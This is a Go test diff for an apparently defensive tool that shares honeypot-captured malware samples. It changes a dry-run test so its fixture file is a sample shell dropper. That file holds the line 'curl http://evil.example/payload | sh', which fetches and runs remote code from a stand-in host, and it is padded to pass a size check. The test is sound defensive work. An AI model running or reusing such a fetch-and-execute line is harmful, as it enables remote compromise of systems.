@@ -111,7 +111,9 @@ func TestShareUploadsAndRecords(t *testing.T) {
 func TestShareDryRunSkipsNetwork(t *testing.T) {
 	dir := t.TempDir()
 	p := filepath.Join(dir, "x")
-	_ = os.WriteFile(p, []byte("#!/bin/sh\n"), 0o600)
+	// Write a plausible shell dropper (>= minSampleBytes=64 bytes).
+	_ = os.WriteFile(p, []byte("#!/bin/sh\ncurl http://evil.example/payload | sh\n"+
+		"# padding to hit 64 bytes for Vet minimum size gate xxxxxxxxxxxx\n"), 0o600)
 
 	hit := false
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -121,13 +123,25 @@ func TestShareDryRunSkipsNetwork(t *testing.T) {
 	defer srv.Close()
 
 	rec := newMemRecorder()
-	uploaded, _, err := Share(context.Background(), rec, []Candidate{{
-		SHA256: "abc", LocalPath: p, SizeBytes: 10, CreatedAt: time.Now(),
-	}}, Options{
+	cand := Candidate{
+		SHA256:     "abc",
+		LocalPath:  p,
+		SizeBytes:  128,
+		Origin:     "cowrie_download",
+		ObservedAt: time.Now().Add(-1 * time.Hour),
+		CreatedAt:  time.Now(),
+	}
+	var sawDryRun bool
+	uploaded, _, err := Share(context.Background(), rec, []Candidate{cand}, Options{
 		Endpoint:  srv.URL,
 		MaxBytes:  1 << 20,
 		DryRun:    true,
 		RateLimit: time.Millisecond,
+		OnProgress: func(_ Candidate, _ Classification, r *Result, _ error) {
+			if r != nil && r.Status == "dry-run" {
+				sawDryRun = true
+			}
+		},
 	})
 	if err != nil {
 		t.Fatalf("Share: %v", err)
@@ -140,6 +154,9 @@ func TestShareDryRunSkipsNetwork(t *testing.T) {
 	}
 	if len(rec.records) != 0 {
 		t.Errorf("dry-run recorded: %v", rec.records)
+	}
+	if !sawDryRun {
+		t.Errorf("candidate never reached the dry-run gate (rejected earlier)")
 	}
 }
 
